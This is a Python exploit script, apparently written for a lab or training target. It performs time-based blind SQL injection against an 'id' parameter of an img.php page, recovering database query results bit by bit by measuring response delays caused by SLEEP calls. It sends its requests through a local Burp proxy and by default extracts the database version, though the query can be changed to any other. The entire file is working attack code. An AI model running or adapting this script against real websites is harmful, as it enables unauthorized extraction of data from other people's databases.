#!/usr/bin/env python3

import requests
import sys 
import urllib3

# configure burp proxy
proxies = { "http" : "http://127.0.0.1:8080", 
            'https': 'http://127.0.0.1:8080'}

# disasbles self signed SSL cert warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s = requests.Session()

def betterSearchFriends(ip, inj_str):
    answer = ""
    for i in range(0,8):
        # perform string replacements for bitshift testing
        # 1' AND IF((ASCII(SUBSTRING(%s,%d,1))>>[BITSHIFT])=[REPLACED],SLEEP(5),1) --
        temp = inj_str
        temp = temp.replace("[REPLACED]", str(int(answer+"0",2)))
        temp = temp.replace("[BITSHIFT]", str(7 - i))

        # change to the url that contains SQLi
        target = "%s/img.php?id=%s&fmt=full" % (ip, temp)

        # verify=False disables SSL cert checks
        results = s.get(target, proxies=proxies, verify=False)

        # check reponse time
        if results.elapsed.total_seconds() >= 10:
            answer += "0"
        else:
            answer += "1"
            
    return chr(int(answer,2))

def get_query_results(ip, command):
    print("[*] Getting results from %s ..." % command)

    results = ""

    for i in range(1, 100):
        injection_string = "' AND IF((ASCII(SUBSTRING((%s),%d,1))>>[BITSHIFT])=[REPLACED],SLEEP(10),1) -- " % (command, i)
        extracted_char = betterSearchFriends(ip, injection_string)
        
        if extracted_char == "\x00" or extracted_char == "\xFF":            
            print("\n[+] Done!")
            return results

        results = results + extracted_char
        
        sys.stdout.write(extracted_char)
        sys.stdout.flush()

def main():
    if len(sys.argv) != 2:
        print("[*] usage: %s <http://URL>" % sys.argv[0])
        print("[*] eg: %s http://127.0.0.1" % sys.argv[0])
        sys.exit(-1)
    
    ip = sys.argv[1]


    r = get_query_results(ip, "SELECT VERSION()")
    print(r)

if __name__ == "__main__":
    main()